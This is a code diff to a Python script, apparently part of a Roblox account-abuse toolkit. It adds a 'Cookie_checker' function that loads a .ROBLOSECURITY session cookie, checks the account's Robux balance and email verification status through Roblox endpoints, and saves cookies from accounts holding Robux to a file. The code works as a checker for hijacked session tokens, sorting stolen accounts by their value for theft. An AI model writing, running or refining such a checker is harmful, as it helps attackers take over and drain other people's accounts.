@@ -32,11 +32,35 @@ def vip_scraper():
 
 
 
-# Transfer bot
-def transfer_bot(price):
-    percent_30 = 30/100 * int(price)
-    add_percent = percent_30 + int(price)
-    print(add_percent)  
+# Cookie Checker
+def Cookie_checker(i):
+    robux_acc = 0
+    email_verify = 0
+    req = requests.Session()
+    req.cookies['.ROBLOSECURITY'] = i
+    try:
+        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
+        r = req.post('https://www.roblox.com/api/item.ashx?')
+        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
+    except:
+        print(Fore.LIGHTRED_EX + '[-] Invalid cookie')
+    req2 = req.get('https://api.roblox.com/my/balance')
+    req3 = req.get('https://accountsettings.roblox.com/v1/email').json()
+    try:
+        z = req2.json()['errors']
+        print(z)
+    except:
+        robux = req2.json()['robux']
+        robux_acc += 1
+        print(Fore.LIGHTGREEN_EX + '[+] Foud Cookie with Robux')
+        ctypes.windll.kernel32.SetConsoleTitleA(f'Accounts With Robux Found: {robux_acc}')
+        with open('robux_cookies.txt', 'w') as f:
+            f.write(f'{i}\n')
+    verify = req3['verified']
+    if verify == True:
+        email_verify += 1
+        print(Fore.LIGHTGREEN_EX + '[+] Found Cookie with Verified Email')
+        ctypes.windll.kernel32.SetConsoleTitleA(f'Accounts With Verified Email: {email_verify}')
 
 # Start Screen
 def StartScreen():
